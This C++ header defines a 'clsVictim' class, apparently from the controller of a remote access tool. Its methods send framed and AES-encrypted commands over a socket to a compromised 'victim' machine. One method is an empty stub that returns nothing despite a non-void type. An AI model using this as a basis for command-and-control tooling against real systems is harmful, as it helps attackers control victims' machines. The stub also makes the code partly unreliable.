#pragma once

#include <arpa/inet.h>
#include <unistd.h>
#include <iostream>
#include <ostream>
#include <string>
#include <vector>

#include "clsEDP.hpp"
#include "clsTools.hpp"
#include "clsEZData.hpp"
#include "clsCrypto.hpp"

class clsVictim
{
private:
    
public:
    int m_nSkt;
    clsCrypto m_crypto;

public:
    clsVictim()
    {

    }
    clsVictim(int nSkt)
    {
        m_nSkt = nSkt;
    }
    clsVictim(int nSkt, clsCrypto crypto)
    {
        m_nSkt = nSkt;
        m_crypto = crypto;
    }

    ~clsVictim() = default;

    ssize_t fnSendRAW(const std::string& szMsg)
    {
        std::vector<unsigned char> vuMsg(szMsg.begin(), szMsg.end());
        return fnSendRAW(vuMsg);
    }
    ssize_t fnSendRAW(const std::vector<unsigned char>& vuBuffer)
    {
        if (m_nSkt < 0) {
            std::cerr << "fnSendRAW: socket not initialized\n";
            return -1;
        }

        size_t total = vuBuffer.size();
        size_t sent = 0;

        while (sent < total) {
            ssize_t n = ::send(m_nSkt, vuBuffer.data() + sent, total - sent, 0);
            if (n < 0) {
                // Interrupted by signal — try again
                if (errno == EINTR) continue;
                std::cerr << "send() failed: " << std::strerror(errno) << "\n";
                return -1;
            }
            if (n == 0) {
                // peer closed connection
                std::cerr << "send() returned 0, peer closed\n";
                return static_cast<ssize_t>(sent);
            }
            sent += static_cast<size_t>(n);
        }

        // Use correct format for ssize_t
        std::cout << "sent bytes: " << sent << std::endl;
        return static_cast<ssize_t>(sent);
    }

    ssize_t fnSend(uint8_t nCommand, uint8_t nParam, const std::vector<unsigned char>& vuBuffer)
    {
        clsEDP edp(nCommand, nParam, vuBuffer);
        std::vector<unsigned char> vuData = edp.fnabGetBytes();
        return fnSendRAW(vuData);
    }
    ssize_t fnSend(uint8_t nCommand, uint8_t nParam, const std::string& szMsg)
    {
        std::vector<unsigned char> vuBuffer(szMsg.begin(), szMsg.end());
        return fnSend(nCommand, nParam, vuBuffer);
    }

    ssize_t fnSendCommand(const std::vector<std::string>& vsMsg)
    {
        std::string szMsg = clsEZData::fnszSendParser(vsMsg);
        
        return fnSendCommand(szMsg);
    }
    ssize_t fnSendCommand(const std::string& szMsg)
    {
        std::vector<unsigned char> vuCipher = m_crypto.fnvuAESEncrypt(szMsg);

        return fnSend(2, 0, vuCipher);
    }

    ssize_t fnSendEncryptedCommand(const std::string& szMsg)
    {

    }

    ssize_t fnSendCmdParam(uint8_t nCommand, uint8_t nParam, uint nLength = 10)
    {
        std::string szFoo = clsEZData::fnszGenerateRandomStr(nLength);
        std::vector<unsigned char> vuBuffer(szFoo.begin(), szFoo.end());

        clsEDP edp(nCommand, nParam, vuBuffer);
        std::vector<unsigned char> vuData = edp.fnabGetBytes();

        return fnSendRAW(vuData);
    }
};